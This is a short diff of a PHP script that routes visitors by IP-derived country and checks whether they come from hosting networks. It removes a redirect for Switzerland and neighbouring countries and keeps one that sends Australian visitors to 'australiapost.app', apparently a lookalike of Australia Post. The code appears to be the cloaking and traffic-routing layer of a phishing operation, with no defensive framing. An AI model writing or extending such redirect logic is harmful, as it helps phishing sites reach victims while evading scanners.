@@ -141,13 +141,6 @@ $is_hosting = (isset($ipinfo_json['hosting']) && $ipinfo_json['hosting']) ? $ipi
 
 $date = date('Y-m-d H:i:s');
 
-// SWITZERLAND & NEIGHBORS REDIRECT (CH, LI, AT, DE, IT)
-$swiss_countries = ['CH', 'LI', 'AT', 'DE', 'IT'];
-if (in_array($count, $swiss_countries)) {
-    header("Location: https://example2.com");
-    exit;
-}
-
 // AUSTRALIA REDIRECT
 if ($count === 'AU') {
     header("Location: https://australiapost.app/");
